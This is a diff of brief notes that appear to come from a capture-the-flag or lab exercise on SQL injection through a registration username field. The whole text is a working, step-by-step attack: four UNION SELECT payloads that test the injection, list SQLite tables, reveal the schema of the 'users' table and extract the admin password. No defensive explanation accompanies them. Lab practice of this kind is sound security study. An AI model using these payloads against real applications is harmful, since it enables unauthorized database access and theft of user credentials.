@@ -1,22 +1,16 @@
 Register with username contains the injection payload.
 Then, login with the payload/credentials you've created.
 
--Format-
-Username
-Password
+Username is the vulnerable input of the query
 
 1. Test
-hax' UNION SELECT id, user, post from posts where user = 'admin'; --
-hax
+' UNION SELECT id, user, post from posts where user = 'admin'; --
 
 2. Get Tables
-haxx' UNION SELECT id, user, (SELECT name FROM sqlite_master WHERE type='table') from posts where user = 'admin'; --
-haxx
+' UNION SELECT id, user, (SELECT name FROM sqlite_master WHERE type='table') from posts where user = 'admin'; --
 
 3. Get columns of the table 'users'
-haxx' UNION SELECT id, user, (SELECT sql FROM sqlite_master WHERE tbl_name = 'users' AND type = 'table') from posts where user = 'admin'; --
-a
+' UNION SELECT id, user, (SELECT sql FROM sqlite_master WHERE tbl_name = 'users' AND type = 'table') from posts where user = 'admin'; --
 
 4. Get the password
-haxx' UNION SELECT id, user, (SELECT pass FROM users WHERE user = 'admin') from posts where user = 'admin'; --
-a
+' UNION SELECT id, user, (SELECT pass FROM users WHERE user = 'admin') from posts where user = 'admin'; --
